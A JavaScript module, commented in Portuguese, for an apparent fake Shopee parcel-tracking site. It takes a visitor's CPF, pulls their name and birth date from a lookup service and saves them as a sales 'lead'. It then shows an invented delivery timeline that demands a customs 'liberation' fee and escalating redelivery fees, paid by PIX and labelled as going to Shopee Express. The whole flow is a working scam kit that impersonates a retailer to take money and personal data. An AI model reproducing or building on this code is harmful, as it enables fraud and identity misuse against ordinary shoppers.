/**
 * Sistema principal de rastreamento - VERSÃO COMPLETA COM TIMESTAMP REAL
 */
import { DataService } from '../utils/data-service.js';
import { CPFValidator } from '../utils/cpf-validator.js';
import { ZentraPayService } from '../services/zentra-pay.js';
import { UIHelpers } from '../utils/ui-helpers.js';
import { RealTimeTrackingService } from '../services/real-time-tracking.js';
import { DatabaseService } from '../services/database.js';

export class TrackingSystem {
    constructor() {
        this.dataService = new DataService();
        this.zentraPayService = new ZentraPayService();
        this.trackingService = new RealTimeTrackingService();
        this.dbService = new DatabaseService();
        this.currentCPF = null;
        this.userData = null;
        this.trackingData = null;
        this.leadData = null;
        this.isInitialized = false;
        this.pixData = null;
        this.liberationPaid = false;
        this.deliveryAttempts = 0;
        this.refreshInterval = null;
    }

    async init() {
        if (this.isInitialized) return;
        
        console.log('🚀 Inicializando sistema de rastreamento completo');
        
        try {
            this.setupCPFInput();
            this.setupTrackingForm();
            this.setupOrderDetailsAccordion();
            this.setupModalEvents();
            this.checkURLParams();
            
            this.isInitialized = true;
            console.log('✅ Sistema de rastreamento inicializado');
        } catch (error) {
            console.error('❌ Erro na inicialização:', error);
        }
    }

    setupCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) return;

        cpfInput.addEventListener('input', (e) => {
            CPFValidator.applyCPFMask(e.target);
        });

        cpfInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.handleTrackingSubmit();
            }
        });
    }

    setupTrackingForm() {
        const form = document.getElementById('trackingForm');
        const button = document.getElementById('trackButton');

        if (form) {
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                this.handleTrackingSubmit();
            });
        }

        if (button) {
            button.addEventListener('click', (e) => {
                e.preventDefault();
                this.handleTrackingSubmit();
            });
        }
    }

    async handleTrackingSubmit() {
        const cpfInput = document.getElementById('cpfInput');
        const trackButton = document.getElementById('trackButton');
        
        if (!cpfInput || !trackButton) {
            console.error('❌ Elementos do formulário não encontrados');
            return;
        }

        const cpf = cpfInput.value.trim();
        
        if (!cpf) {
            this.showError('Por favor, digite um CPF');
            return;
        }

        if (!CPFValidator.isValidCPF(cpf)) {
            this.showError('CPF inválido. Verifique os dados digitados.');
            return;
        }

        this.currentCPF = CPFValidator.cleanCPF(cpf);
        
        trackButton.disabled = true;
        trackButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Rastreando...';

        this.showLoadingNotification();

        try {
            console.log('🔍 Buscando dados para CPF:', this.currentCPF);
            
            // Buscar ou criar lead no banco
            await this.getOrCreateLead();
            
            // Buscar dados do usuário
            const data = await this.dataService.fetchCPFData(this.currentCPF);
            console.log('📊 Dados recebidos:', data);
            
            if (data && data.DADOS) {
                this.userData = {
                    nome: data.DADOS.nome,
                    cpf: this.currentCPF,
                    nascimento: data.DADOS.data_nascimento,
                    situacao: 'REGULAR'
                };

                console.log('✅ Dados obtidos:', this.userData);
                
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                this.closeLoadingNotification();
                
                this.displayOrderDetails();
                this.generateRealTimeTrackingData();
                this.displayTrackingResults();
                
                // Iniciar atualização automática
                this.startAutoRefresh();
                
                const orderDetails = document.getElementById('orderDetails');
                if (orderDetails) {
                    this.scrollToElement(orderDetails, 100);
                }
                
            } else {
                throw new Error('Dados não encontrados');
            }
            
        } catch (error) {
            console.error('❌ Erro no rastreamento:', error);
            this.closeLoadingNotification();
            this.showError('Erro ao buscar dados. Tente novamente.');
        } finally {
            trackButton.disabled = false;
            trackButton.innerHTML = '<i class="fas fa-search"></i> Rastrear Pacote';
        }
    }

    async getOrCreateLead() {
        try {
            // Buscar lead existente
            const existingLead = await this.dbService.getLeadByCPF(this.currentCPF);
            
            if (existingLead.success && existingLead.data) {
                this.leadData = existingLead.data;
                this.liberationPaid = existingLead.data.liberation_paid || false;
                this.deliveryAttempts = existingLead.data.delivery_attempts || 0;
                console.log('📋 Lead existente encontrado:', this.leadData);
            } else {
                // Criar novo lead com timestamp inicial
                const newLead = {
                    cpf: this.currentCPF,
                    nome_completo: 'Cliente Shopee',
                    initial_timestamp: new Date().toISOString(),
                    liberation_paid: false,
                    delivery_attempts: 0,
                    origem: 'rastreamento'
                };
                
                const result = await this.dbService.createLead(newLead);
                if (result.success) {
                    this.leadData = result.data;
                    console.log('📋 Novo lead criado:', this.leadData);
                }
            }
        } catch (error) {
            console.error('❌ Erro ao buscar/criar lead:', error);
        }
    }

    generateRealTimeTrackingData() {
        if (!this.leadData) return;
        
        const initialTimestamp = this.leadData.initial_timestamp;
        const currentTime = new Date();
        
        this.trackingData = {
            timeline: this.trackingService.generateTimeline(
                initialTimestamp, 
                currentTime, 
                this.liberationPaid,
                this.deliveryAttempts
            ),
            initialTimestamp: initialTimestamp,
            liberationPaid: this.liberationPaid,
            deliveryAttempts: this.deliveryAttempts
        };
        
        console.log('📊 Timeline gerada:', this.trackingData);
    }

    displayTrackingResults() {
        const trackingResults = document.getElementById('trackingResults');
        const customerNameStatus = document.getElementById('customerNameStatus');
        const currentStatus = document.getElementById('currentStatus');
        const trackingTimeline = document.getElementById('trackingTimeline');

        if (trackingResults) {
            trackingResults.style.display = 'block';
        }

        if (customerNameStatus) {
            customerNameStatus.textContent = this.userData.nome.split(' ')[0];
        }

        if (currentStatus) {
            const status = this.trackingService.getCurrentStatus(this.trackingData.timeline);
            currentStatus.textContent = status;
        }

        if (trackingTimeline) {
            this.renderTimeline(trackingTimeline);
        }

        setTimeout(() => {
            this.animateTimeline();
        }, 500);
    }

    renderTimeline(container) {
        container.innerHTML = '';

        this.trackingData.timeline.forEach((step, index) => {
            const timelineItem = this.createTimelineItem(step, index);
            container.appendChild(timelineItem);
        });
    }

    createTimelineItem(step, index) {
        const item = document.createElement('div');
        item.className = `timeline-item ${step.completed ? 'completed' : ''}`;
        
        if (index === 0) {
            item.classList.add('first');
        }

        if (step.isPostPayment) {
            item.style.background = 'linear-gradient(135deg, #d4edda, #c3e6cb)';
            item.style.borderRadius = '10px';
            item.style.padding = '15px';
            item.style.margin = '10px 0';
            item.style.border = '2px solid #27ae60';
        }

        const dateFormatted = step.date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeFormatted = step.date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        let buttonHtml = '';
        
        // Botão de liberação aduaneira
        if (step.needsLiberation) {
            buttonHtml = `
                <button class="liberation-button-timeline" data-liberation-button>
                    <i class="fas fa-unlock"></i> LIBERAR OBJETO
                </button>
            `;
        }
        
        // Botão de tentativa de entrega
        if (step.needsDeliveryPayment) {
            buttonHtml = `
                <button class="delivery-retry-btn" data-attempt="${step.attemptNumber}" data-value="${step.value}">
                    <i class="fas fa-redo"></i> Reenviar Pacote - R$ ${step.value.toFixed(2)}
                </button>
            `;
        }


        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateFormatted}</span>
                    <span class="time">${timeFormatted}</span>
                </div>
                <div class="timeline-text">
                    <p>
                        ${step.isChina ? '<span class="china-tag">[China]</span>' : ''}
                        ${step.description}
                    </p>
                    ${buttonHtml}
                </div>
            </div>
        `;

        // Configurar eventos dos botões
        setTimeout(() => {
            this.setupTimelineButtons(item);
        }, 100);

        return item;
    }

    setupTimelineButtons(item) {
        // Botão de liberação
        const liberationBtn = item.querySelector('[data-liberation-button]');
        if (liberationBtn) {
            liberationBtn.addEventListener('click', () => {
                this.showLiberationModal();
            });
        }

        // Botão de reenvio
        const deliveryBtn = item.querySelector('.delivery-retry-btn');
        if (deliveryBtn) {
            deliveryBtn.addEventListener('click', () => {
                const attempt = parseInt(deliveryBtn.dataset.attempt);
                const value = parseFloat(deliveryBtn.dataset.value);
                this.showDeliveryModal(attempt, value);
            });
        }

    }


    async showLiberationModal() {
        console.log('🔓 Abrindo modal de liberação');
        
        const modal = document.getElementById('liberationModal');
        if (!modal) {
            console.error('❌ Modal de liberação não encontrado');
            return;
        }

        // Abrir modal imediatamente
        modal.style.display = 'flex';
        document.body.style.overflow = 'hidden';

        // Gerar PIX em background
        this.generatePixInBackground();
    }

    async generatePixInBackground() {
        console.log('🔄 Gerando PIX em background...');
        
        this.showPixLoadingState();
        
        try {
            const pixResult = await this.zentraPayService.createPixTransaction(
                this.userData, 
                26.34
            );

            if (pixResult.success) {
                console.log('🎉 PIX gerado com sucesso!');
                this.pixData = pixResult;
                this.updateModalWithRealPix();
            } else {
                console.warn('⚠️ Erro ao gerar PIX, usando estático');
                this.updateModalWithStaticPix();
            }
            
        } catch (error) {
            console.error('💥 Erro ao gerar PIX:', error);
            this.updateModalWithStaticPix();
        }
    }

    showPixLoadingState() {
        const qrCodeImg = document.getElementById('realPixQrCode');
        const pixCodeTextarea = document.getElementById('pixCodeModal');
        const copyButton = document.getElementById('copyPixButtonModal');

        if (qrCodeImg) {
            qrCodeImg.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgdmlld0JveD0iMCAwIDIwMCAyMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIiBmaWxsPSIjZjhmOWZhIi8+CjxjaXJjbGUgY3g9IjEwMCIgY3k9IjEwMCIgcj0iMjAiIGZpbGw9IiNmZjZiMzUiPgogIDxhbmltYXRlVHJhbnNmb3JtIGF0dHJpYnV0ZU5hbWU9InRyYW5zZm9ybSIgYXR0cmlidXRlVHlwZT0iWE1MIiB0eXBlPSJyb3RhdGUiIGZyb209IjAgMTAwIDEwMCIgdG89IjM2MCAxMDAgMTAwIiBkdXI9IjFzIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIvPgo8L2NpcmNsZT4KPHRleHQgeD0iMTAwIiB5PSIxNDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiM2NjYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMiI+U29saWNpdGFuZG8uLi48L3RleHQ+Cjwvc3ZnPg==';
        }

        if (pixCodeTextarea) {
            pixCodeTextarea.value = 'Solicitando liberação...';
            pixCodeTextarea.style.color = '#999';
            pixCodeTextarea.style.fontStyle = 'italic';
        }

        if (copyButton) {
            copyButton.disabled = true;
            copyButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Solicitando...';
            copyButton.style.opacity = '0.7';
        }
    }

    updateModalWithRealPix() {
        const qrCodeImg = document.getElementById('realPixQrCode');
        const pixCodeTextarea = document.getElementById('pixCodeModal');
        const copyButton = document.getElementById('copyPixButtonModal');

        if (qrCodeImg && this.pixData.pixPayload) {
            qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`;
        }

        if (pixCodeTextarea && this.pixData.pixPayload) {
            pixCodeTextarea.value = this.pixData.pixPayload;
            pixCodeTextarea.style.color = '';
            pixCodeTextarea.style.fontStyle = '';
        }

        if (copyButton) {
            copyButton.disabled = false;
            copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar';
            copyButton.style.opacity = '';
        }
    }

    updateModalWithStaticPix() {
        const qrCodeImg = document.getElementById('realPixQrCode');
        const pixCodeTextarea = document.getElementById('pixCodeModal');
        const copyButton = document.getElementById('copyPixButtonModal');
        const staticPix = '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';

        if (qrCodeImg) {
            qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(staticPix)}`;
        }

        if (pixCodeTextarea) {
            pixCodeTextarea.value = staticPix;
            pixCodeTextarea.style.color = '';
            pixCodeTextarea.style.fontStyle = '';
        }

        if (copyButton) {
            copyButton.disabled = false;
            copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar';
            copyButton.style.opacity = '';
        }
    }

    async showDeliveryModal(attemptNumber, value) {
        console.log(`🚚 Abrindo modal de reenvio - Tentativa ${attemptNumber} - R$ ${value.toFixed(2)}`);
        
        // Criar modal dinamicamente
        const modal = document.createElement('div');
        modal.className = 'modal-overlay';
        modal.id = 'deliveryModal';
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;

        // Gerar PIX para entrega
        let qrCodeSrc, pixPayload;
        try {
            const pixResult = await this.zentraPayService.createPixTransaction(this.userData, value);
            if (pixResult.success) {
                qrCodeSrc = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixResult.pixPayload)}`;
                pixPayload = pixResult.pixPayload;
            } else {
                throw new Error('Fallback para PIX estático');
            }
        } catch (error) {
            qrCodeSrc = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
            pixPayload = '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
        }

        modal.innerHTML = `
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Tentativa de Entrega ${attemptNumber}°</h2>
                    <button class="professional-modal-close" id="closeDeliveryModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${value.toFixed(2)}.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reenvio - ${attemptNumber}° Tentativa</span>
                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
                        </div>
                    </div>

                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${qrCodeSrc}" alt="QR Code PIX Reenvio" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${pixPayload}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="simulation-section" style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #e9ecef; text-align: center;">
                            <button class="simulation-button" id="simulateDeliveryPayment" data-attempt="${attemptNumber}" style="
                                background: linear-gradient(45deg, #27ae60, #2ecc71);
                                color: white;
                                border: none;
                                padding: 12px 25px;
                                font-size: 14px;
                                font-weight: 600;
                                border-radius: 8px;
                                cursor: pointer;
                                transition: all 0.3s ease;
                                font-family: Inter, sans-serif;
                                display: inline-flex;
                                align-items: center;
                                gap: 8px;
                                box-shadow: 0 2px 8px rgba(39, 174, 96, 0.3);
                            ">
                                <i class="fas fa-check-circle"></i>
                                Simular Pagamento Realizado
                            </button>
                            <p style="font-size: 12px; color: #999; margin-top: 8px; font-family: Inter, sans-serif;">
                                Para fins de demonstração
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);
        document.body.style.overflow = 'hidden';

        // Configurar eventos
        this.setupDeliveryModalEvents(modal, attemptNumber);
    }

    setupDeliveryModalEvents(modal, attemptNumber) {
        // Botão fechar
        const closeButton = modal.querySelector('#closeDeliveryModal');
        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closeDeliveryModal();
            });
        }

        // Botão copiar PIX
        const copyButton = modal.querySelector('#copyDeliveryPixButton');
        if (copyButton) {
            copyButton.addEventListener('click', () => {
                this.copyDeliveryPixCode();
            });
        }

        // Botão simular pagamento
        const simulateButton = modal.querySelector('#simulateDeliveryPayment');
        if (simulateButton) {
            simulateButton.addEventListener('click', () => {
                this.simulateDeliveryPayment(attemptNumber);
            });
        }

        // Fechar ao clicar fora
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                this.closeDeliveryModal();
            }
        });
    }

    async simulateDeliveryPayment(attemptNumber) {
        console.log(`🎭 Simulando pagamento da ${attemptNumber}° tentativa`);
        
        // Fechar modal
        this.closeDeliveryModal();
        
        // Incrementar tentativas
        this.deliveryAttempts++;
        
        // Atualizar no banco
        await this.dbService.updateDeliveryAttempts(this.currentCPF, this.deliveryAttempts);
        
        // Mostrar notificação
        this.showPaymentSuccessNotification(`${attemptNumber}° tentativa paga`);
        
        // Regenerar timeline
        setTimeout(() => {
            this.generateRealTimeTrackingData();
            this.displayTrackingResults();
        }, 2000);
    }

    copyDeliveryPixCode() {
        const pixInput = document.getElementById('deliveryPixCode');
        const copyButton = document.getElementById('copyDeliveryPixButton');
        
        if (!pixInput || !copyButton) return;

        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    this.showCopySuccess(copyButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
        }
    }

    closeDeliveryModal() {
        const modal = document.getElementById('deliveryModal');
        if (modal) {
            modal.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (modal.parentNode) {
                    modal.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    setupOrderDetailsAccordion() {
        const detailsHeader = document.getElementById('detailsHeader');
        const detailsContent = document.getElementById('detailsContent');
        const toggleIcon = document.querySelector('.toggle-icon');

        if (detailsHeader && detailsContent) {
            detailsHeader.addEventListener('click', () => {
                const isExpanded = detailsContent.classList.contains('expanded');
                
                if (isExpanded) {
                    detailsContent.classList.remove('expanded');
                    if (toggleIcon) toggleIcon.classList.remove('rotated');
                } else {
                    detailsContent.classList.add('expanded');
                    if (toggleIcon) toggleIcon.classList.add('rotated');
                }
            });
        }
    }

    setupModalEvents() {
        // Modal de liberação
        const closeModal = document.getElementById('closeModal');
        const copyPixButton = document.getElementById('copyPixButtonModal');
        const simulatePaymentButton = document.getElementById('simulatePaymentButton');
        const liberationModal = document.getElementById('liberationModal');

        if (closeModal) {
            closeModal.addEventListener('click', () => {
                this.closeLiberationModal();
            });
        }

        if (copyPixButton) {
            copyPixButton.addEventListener('click', () => {
                this.copyPixCode();
            });
        }

        if (simulatePaymentButton) {
            simulatePaymentButton.addEventListener('click', () => {
                this.simulatePayment();
            });
        }

        if (liberationModal) {
            liberationModal.addEventListener('click', (e) => {
                if (e.target === liberationModal) {
                    this.closeLiberationModal();
                }
            });
        }
    }

    async simulatePayment() {
        console.log('🎭 Simulando pagamento da taxa de liberação');
        
        // Fechar modal
        this.closeLiberationModal();
        
        // Marcar como pago
        this.liberationPaid = true;
        
        // Atualizar no banco
        await this.dbService.updateLiberationStatus(this.currentCPF, true);
        
        // Mostrar notificação
        this.showPaymentSuccessNotification('Taxa de liberação paga');
        
        // Regenerar timeline
        setTimeout(() => {
            this.generateRealTimeTrackingData();
            this.displayTrackingResults();
        }, 2000);
    }

    showPaymentSuccessNotification(message) {
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(45deg, #27ae60, #2ecc71);
            color: white;
            padding: 20px 25px;
            border-radius: 12px;
            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.4);
            z-index: 3000;
            animation: slideInRight 0.5s ease;
            font-family: Inter, sans-serif;
            max-width: 350px;
        `;
        
        notification.innerHTML = `
            <div style="display: flex; align-items: center; gap: 12px;">
                <i class="fas fa-check-circle" style="font-size: 24px;"></i>
                <div>
                    <div style="font-weight: 700; font-size: 16px; margin-bottom: 4px;">
                        Pagamento Confirmado!
                    </div>
                    <div style="font-size: 14px; opacity: 0.9;">
                        ${message}
                    </div>
                </div>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            if (notification.parentNode) {
                notification.style.animation = 'slideOutRight 0.5s ease';
                setTimeout(() => notification.remove(), 500);
            }
        }, 4000);
    }

    closeLiberationModal() {
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    copyPixCode() {
        const pixInput = document.getElementById('pixCodeModal');
        const copyButton = document.getElementById('copyPixButtonModal');
        
        if (!pixInput || !copyButton) return;

        try {
            pixInput.select();
            pixInput.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(pixInput.value).then(() => {
                    this.showCopySuccess(copyButton);
                }).catch(() => {
                    this.fallbackCopy(pixInput, copyButton);
                });
            } else {
                this.fallbackCopy(pixInput, copyButton);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
        }
    }

    fallbackCopy(input, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                this.showCopySuccess(button);
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
        }
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    displayOrderDetails() {
        if (!this.userData) return;

        const orderDetails = document.getElementById('orderDetails');
        const customerName = document.getElementById('customerName');
        const fullName = document.getElementById('fullName');
        const formattedCpf = document.getElementById('formattedCpf');

        if (orderDetails) {
            orderDetails.style.display = 'block';
        }

        if (customerName) {
            customerName.textContent = this.userData.nome.split(' ')[0];
        }

        if (fullName) {
            fullName.textContent = this.userData.nome;
        }

        if (formattedCpf) {
            formattedCpf.textContent = CPFValidator.formatCPF(this.userData.cpf);
        }
    }

    startAutoRefresh() {
        // Atualizar a cada 30 segundos para verificar novas etapas
        this.refreshInterval = setInterval(() => {
            if (this.trackingData) {
                const hasNewSteps = this.trackingService.checkForNewSteps(this.trackingData.timeline);
                if (hasNewSteps) {
                    console.log('🔄 Novas etapas disponíveis, atualizando...');
                    this.displayTrackingResults();
                }
            }
        }, 30000);
    }

    stopAutoRefresh() {
        if (this.refreshInterval) {
            clearInterval(this.refreshInterval);
            this.refreshInterval = null;
        }
    }

    showLoadingNotification() {
        UIHelpers.showLoadingNotification();
    }

    closeLoadingNotification() {
        UIHelpers.closeLoadingNotification();
    }

    showError(message) {
        UIHelpers.showError(message);
    }

    scrollToElement(element, offset = 0) {
        UIHelpers.scrollToElement(element, offset);
    }

    animateTimeline() {
        UIHelpers.animateTimeline();
    }

    checkURLParams() {
        const urlParams = new URLSearchParams(window.location.search);
        const focusCpf = urlParams.get('focus');
        
        if (focusCpf === 'cpf') {
            setTimeout(() => {
                const cpfInput = document.getElementById('cpfInput');
                if (cpfInput) {
                    cpfInput.focus();
                }
            }, 500);
        }
    }

    setZentraPayApiSecret(apiSecret) {
        if (this.zentraPayService) {
            this.zentraPayService.setApiSecret(apiSecret);
        }
    }

    // Cleanup ao sair
    cleanup() {
        this.stopAutoRefresh();
        console.log('🧹 Sistema de rastreamento limpo');
    }
}